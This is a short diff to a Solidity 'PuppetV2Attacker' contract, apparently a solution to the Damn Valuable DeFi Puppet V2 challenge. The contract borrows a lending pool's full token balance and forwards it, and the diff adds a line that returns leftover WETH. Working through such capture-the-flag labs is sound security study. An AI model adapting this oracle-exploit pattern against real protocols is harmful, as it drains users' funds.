@@ -5,6 +5,7 @@ import {WETH} from "solmate/tokens/WETH.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {PuppetV2Pool} from "../../src/puppet-v2/PuppetV2Pool.sol";
 import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
+import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";
 
 contract PuppetV2Attacker {
     uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 10_000e18;
@@ -29,6 +30,7 @@ contract PuppetV2Attacker {
         weth.approve(address(lendingPool), amount);
         lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);
         token.transfer(recovery, POOL_INITIAL_TOKEN_BALANCE);
+        weth.transfer(msg.sender, weth.balanceOf(address(this)));
     }
     function recieve() external payable {}
 }
